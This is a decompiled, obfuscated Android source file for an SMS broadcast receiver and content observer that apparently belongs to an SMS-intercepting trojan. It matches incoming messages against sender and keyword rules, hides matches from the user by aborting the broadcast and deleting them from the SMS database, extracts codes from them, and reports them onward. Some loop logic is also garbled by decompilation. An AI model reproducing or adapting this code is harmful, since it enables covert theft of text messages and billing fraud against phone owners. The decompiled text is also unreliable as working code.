package com.amaz.onib;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsMessage;
import bn.sdk.szwcsss.common.az.c.model.Cdo;
import bn.sdk.szwcsss.common.az.c.receiver.ReceiveSmsReceiver;
import java.util.Iterator;
import java.util.List;
@SuppressLint({"HandlerLeak"})
/* loaded from: classes.dex */
public class bd extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    private static bc f665a;
    private boolean c = false;
    private String d = "";
    private String e = "";
    private Handler f = new Handler() { // from class: com.amaz.onib.bd.1
        @Override // android.os.Handler
        public void handleMessage(Message message) {
            if (!bd.this.c) {
                Bundle data = message.getData();
                bd.this.d = data.getString("sms_content");
                bd.this.e = data.getString("phone_num");
                bs.b(" num" + bd.this.e + "-----msg:" + bd.this.d);
                bd.this.a(bd.this.d, bd.this.e, bd.this.b, true);
            }
        }
    };
    private Context b = Utils.ctx;

    public bd() {
        try {
            if (this.b != null) {
                f665a = new bc(this.b, this.f);
                this.b.getContentResolver().registerContentObserver(Uri.parse(Cdo.e), true, f665a);
            }
        } catch (Exception e) {
            bs.b(e.toString());
        }
    }

    private void a(Context context, List<h> list, String str, String str2, boolean z, boolean z2) {
        boolean z3;
        for (h hVar : list) {
            if ("1".equals(hVar.i) && str != null) {
                if (!by.a(hVar.d) && str.startsWith(hVar.d)) {
                    bb.a(hVar, str, str2);
                    boolean a2 = a(context, str2, z);
                    if (!z2 || a2) {
                        bs.b("拦截上报isDB:" + z + "#" + str + "#" + str2 + "");
                        bb.a(context, str, str2, hVar, "", z, false, a2);
                        return;
                    }
                    return;
                } else if (hVar.j != null && hVar.j.length > 0) {
                    int i = 0;
                    while (true) {
                        if (i >= hVar.j.length) {
                            z3 = false;
                            break;
                        } else if (str.startsWith(hVar.j[i].trim())) {
                            z3 = true;
                            break;
                        } else {
                            i++;
                        }
                    }
                    if (!z3) {
                        continue;
                    } else if (hVar.k == null || hVar.k.length <= 0 || str2 == null) {
                        bb.a(hVar, str, str2);
                        boolean a3 = a(context, str2, z);
                        if (!z2 || a3) {
                            bs.b("拦截上报isDB:" + z + "#" + str + "#" + str2 + "");
                            bb.a(context, str, str2, hVar, "", z, false, a3);
                            return;
                        }
                        return;
                    } else {
                        for (int i2 = 0; i2 < hVar.k.length; i2++) {
                            if (str2.indexOf(hVar.k[i2].trim()) != -1) {
                                bb.a(hVar, str, str2);
                                boolean a4 = a(context, str2, z);
                                if (!z2 || a4) {
                                    bs.b("拦截上报isDB:" + z + "#" + str + "#" + str2 + "");
                                    bb.a(context, str, str2, hVar, "", z, false, a4);
                                    return;
                                }
                                return;
                            }
                        }
                        continue;
                    }
                }
            }
        }
    }

    private boolean a(Context context, String str, boolean z) {
        if (!z) {
            try {
                abortBroadcast();
            } catch (Exception e) {
                bs.b(e.getMessage());
            }
        }
        if (!z) {
            return false;
        }
        boolean a2 = f665a.a(context, str);
        bs.b("del:" + a2);
        return a2;
    }

    private boolean a(Context context, List<h> list, g gVar, String str, String str2, boolean z) {
        boolean z2;
        boolean z3;
        boolean z4 = false;
        Iterator<h> it = list.iterator();
        while (true) {
            boolean z5 = z4;
            if (!it.hasNext()) {
                return z5;
            }
            h next = it.next();
            if (next.l != 0 && !by.a(next.m) && str != null && str.startsWith(next.m) && str.length() > next.m.length()) {
                String b = bb.b(next, str, str2);
                if (!by.a(b)) {
                    boolean a2 = gVar.a(next.f732a, next.z);
                    if (!a2) {
                        if ("5".equals(next.q) && 1 != next.l && b.length() > 2) {
                            z2 = bb.a(next, b);
                        } else if ("17".equals(next.q)) {
                            bb.b(next, b);
                            z2 = true;
                        } else if (!"25".equals(next.q) || by.a(next.r)) {
                            z2 = (!"4".equals(next.q) || by.a(next.t)) ? bb.a(next, str, b, str2) : bb.a(next, b);
                        } else {
                            String[] split = next.r.split(",");
                            if (split.length >= 2) {
                                bb.a(context, next, split[1], b);
                                z3 = true;
                            } else {
                                z3 = a2;
                            }
                            z2 = z3;
                        }
                        if (z2) {
                            gVar.a(next.f732a, next.z, "deal", "1");
                        }
                    } else {
                        z2 = a2;
                    }
                    boolean a3 = a(context, str2, z);
                    if (!a2 || a3) {
                        bb.a(context, str, str2, next, b, z, z2, a3);
                    }
                    z5 = true;
                }
            }
            z4 = z5;
        }
    }

    public void a() {
        if (f665a != null && this.b != null) {
            this.b.getContentResolver().unregisterContentObserver(f665a);
        }
    }

    public void a(String str, String str2, Context context, boolean z) {
        g a2 = g.a(context);
        List<h> a3 = a2.a();
        String replace = (str2 == null || !str2.startsWith("+86")) ? str2 : str2.replace("+86", "");
        a(context, a3, replace, str, z, a(context, a3, a2, replace, str, z));
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String str;
        this.c = true;
        if (!ReceiveSmsReceiver.f557a.equals(intent.getAction())) {
            bs.b("action is error");
            this.c = false;
            return;
        }
        Bundle extras = intent.getExtras();
        if (extras == null) {
            bs.b(" bundle is null");
            this.c = false;
            return;
        }
        Object[] objArr = (Object[]) extras.get("pdus");
        SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
        String str2 = "";
        StringBuffer stringBuffer = new StringBuffer();
        int i = 0;
        while (i < objArr.length) {
            if (objArr[i] != null) {
                smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                if (smsMessageArr[i] != null) {
                    str = smsMessageArr[i].getOriginatingAddress();
                    stringBuffer.append(smsMessageArr[i].getMessageBody());
                    i++;
                    str2 = str;
                }
            }
            str = str2;
            i++;
            str2 = str;
        }
        String stringBuffer2 = stringBuffer.toString();
        bs.b("sms rec:" + stringBuffer2);
        a(stringBuffer2, str2, context, false);
        this.c = false;
    }
}
